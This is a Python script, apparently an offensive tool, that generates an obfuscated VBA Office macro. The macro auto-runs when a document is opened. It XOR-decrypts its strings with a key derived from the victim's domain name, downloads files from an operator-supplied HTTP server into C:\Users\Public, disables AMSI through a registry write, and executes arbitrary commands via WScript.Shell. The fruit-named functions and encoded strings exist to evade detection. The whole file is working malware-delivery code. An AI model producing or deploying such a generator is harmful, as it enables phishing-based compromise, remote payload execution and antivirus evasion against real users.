#!/usr/bin/env python3

import os, sys
import argparse

TEMPLATE = """Function Pears(Beets, Mango)
    Pears = Chr((Beets Xor Mango) - 17)
End Function

Function Strawberries(Grapes)
    Strawberries = Left(Grapes, 3)
End Function

Function Almonds(Jelly)
    Almonds = Right(Jelly, Len(Jelly) - 3)
End Function

Function Nuts(Milk)
    Dim Mango As String
    Mango = GetDomainName()
    Banana = Lemon(Mango)
    Dim X As Long
    Dim Berry As Long
    X = 0
    Do
    Berry = Banana(X)
    X = X + 1
    X = X Mod UBound(Banana)
    
    Oatmilk = Oatmilk + Pears(Strawberries(Milk), Berry)
    Milk = Almonds(Milk)
    Loop While Len(Milk) > 0
    Nuts = Oatmilk
End Function
Function GetDomainName()
    Set wshNetwork = CreateObject("WScript.Network")
    GetDomainName = UCase(wshNetwork.UserDomain)
End Function

Function Lemon(TextInput)
    Dim abData() As Integer, X As Long
    X = 0
    ReDim Preserve abData(X)
    Do
    abData(X) = Asc(TextInput)
    TextInput = Right(TextInput, Len(TextInput) - 1)
    X = X + 1
    ReDim Preserve abData(0 To X)
    Loop While Len(TextInput) > 0
    Lemon = abData
End Function

Function DownloadFile(FileD)
    Dim myURL As String
    myURL = Nuts("{baseHttpUrl}") & FileD
    
    Dim WinHttpReq As Object
    Set WinHttpReq = CreateObject("Microsoft.XMLHTTP")
    WinHttpReq.Open "GET", myURL, False
    WinHttpReq.send
    
    If WinHttpReq.Status = 200 Then
        Set oStream = CreateObject("ADODB.Stream")
        oStream.Open
        oStream.Type = 1
        oStream.Write WinHttpReq.responseBody
        oStream.SaveToFile Nuts("{fileDownloadPath}") & FileD, 2 ' 1 = no overwrite, 2 = overwrite
        oStream.Close
    End If

End Function

Function Run(C)
    paperino = Nuts("{amsiEnable}")
    Set pippo = GetObject(Nuts("{regClsId}"))
    E = 0
    On Error Resume Next
    r = pippo.RegRead(paperino)
    If r <> 0 Then
        pippo.RegWrite paperino, "0", Nuts("{regDword}")
        E = 1
    End If

    If Err.Number <> 0 Then
        pippo.RegWrite paperino, "0", Nuts("{regDword}")
        E = 1
    Err.Clear
    End If
    
    Set minnie = CreateObject(Nuts("{wscriptShell}"))
    minnie.Exec(Nuts(C))
    On Error GoTo 0
End Function

Sub MyMacro()
{commands}
End Sub

Sub TestVersion()
   Dim intVersion    As Integer

   #If Win64 Then

      intVersion = 64

   #Else

      intVersion = 32

   #End If

   MsgBox "Your are running office versison = " & intVersion
End Sub
Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub
"""

DEFAULT_DICT = {
    "baseHttpUrl":"",
    "fileDownloadPath": "C:\\Users\\Public\\",
    "amsiEnable": "HKCU\\Software\\Microsoft\\Windows Script\\Settings\\AmsiEnable",
    "regClsId": "new:72C24DD5-D70A-438B-8A42-98424B88AFB8",
    "regDword": "REG_DWORD",
    "wscriptShell": "WScript.Shell",
    "commands": "",
    "key": ""
}

COMMANDS_TEMPLATES = {
    "dwld": 'DownloadFile(Nuts("{value}"))',
    "exec": 'Run("{value}")'
}

def encrypt(s, key):
    out = ""
    for idx, c in enumerate(s):
        x = ord(c)+17
        x = x^ord(key[idx%len(key)])
        y = str(x).zfill(3)
        out += y
    return out

def decrypt(s, key):
    out = ""
    idx = 0
    for i in range(0, len(s), 3):
        x = int(s[i:i+3])
        x = x^ord(key[idx%len(key)])
        x -= 17
        out += chr(x)
        idx += 1
    return out

def build_vba(key:str, settings: dict, commands: list):
    enc_dict = {k:encrypt(v, key) for k,v in settings.items()}
    commands_as_str = ""
    for item in commands:
        commands_as_str += COMMANDS_TEMPLATES[item['type']].format(value=encrypt(item['value'], key)) + "\n"
    enc_dict["commands"] = commands_as_str
    return TEMPLATE.format(**enc_dict)

if __name__ == '__main__':
    parser = argparse.ArgumentParser(prog = 'Encrypted Macro Generator')
    parser.add_argument('-k', '--key', help='The key to use for encryption (will be made uppercase)', required=True)
    parser.add_argument('-b', '--http-base', help='The base http URL to use for file download', required=True)
    parser.add_argument('-p', '--path', default='C:\\Users\\Public\\', help='The base path in which to download files')
    parser.add_argument('commands', nargs='+', help='The commands to execute. Can be in the form "dwld:filename" or "exec:command"')
    args = parser.parse_args()
    
    commands = []
    for cmd in args.commands:
        valid = False
        for k,v in COMMANDS_TEMPLATES.items():
            if cmd.split(':')[0] == k:
                valid = True
                commands.append({'type':k, 'value':cmd.split(':', maxsplit=1)[1]})
        if not valid:
            print(f"Action not recognized: {cmd}")
    
    settings_dict = dict(DEFAULT_DICT)
    settings_dict["baseHttpUrl"] = args.http_base + ('/' if not args.http_base.endswith('/') else '')
    settings_dict["fileDownloadPath"] = args.path + ('\\' if not args.path.endswith('\\') else '')
    key = args.key.upper()

    print("Settings:", file=sys.stderr)
    print(f"XOR KEY: {key}", file=sys.stderr)
    print(f"HTTP Server base URL: {settings_dict['baseHttpUrl']}", file=sys.stderr)
    print(f"Local download base path: {settings_dict['fileDownloadPath']}", file=sys.stderr)
    print(f"Commands:", file=sys.stderr)
    print(commands, file=sys.stderr)
    print(build_vba(key, settings_dict, commands))